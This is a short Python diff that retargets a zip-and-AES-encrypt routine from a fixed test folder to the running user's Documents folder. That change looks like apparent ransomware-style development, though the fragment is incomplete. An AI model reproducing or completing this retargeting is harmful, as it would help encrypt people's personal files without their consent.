@@ -5,6 +5,8 @@ import shutil
 import os, random, struct
 from Crypto.Cipher import AES
 import uuid
+import getpass
+
 
 def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
     if not out_filename:
@@ -35,7 +37,7 @@ def zipdir(path, ziph):
             ziph.write(os.path.join(root, file))
 
 def encryptionExecute():
-	path = '/Users/Hareesh/test'
+	path = '/Users/'+getpass.getuser()+'/Documents'
 	pathZip = path + ".zip"
 	zipf = zipfile.ZipFile(pathZip, 'w', zipfile.ZIP_DEFLATED)
 	zipdir(path, zipf)
